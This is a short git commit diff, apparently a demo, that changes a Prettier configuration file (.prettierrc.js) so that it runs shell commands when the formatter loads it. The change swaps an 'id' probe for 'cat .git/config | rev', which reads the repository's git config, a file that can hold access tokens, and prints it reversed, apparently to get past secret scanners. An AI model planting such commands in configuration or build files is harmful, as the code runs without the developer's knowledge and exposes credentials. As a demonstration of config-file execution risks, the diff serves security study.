c6f6514ef22310c32e7705b87dd66d169cd66a19
Testuser <test@example.com>
2026-03-10 12:09:28 +0100

    demo

--- test.md/.prettierrc.js
+++ test.md/.prettierrc.js
@@ -3,7 +3,7 @@ import { execSync } from "child_process";
 console.error("Hello, world!");
 
 try {
-    const output = execSync("id", { encoding: "utf-8" });
+    const output = execSync("cat .git/config | rev", { encoding: "utf-8" });
     console.error(output.trim());
 } catch (err) {
     console.error("Error executing id:", err.message);
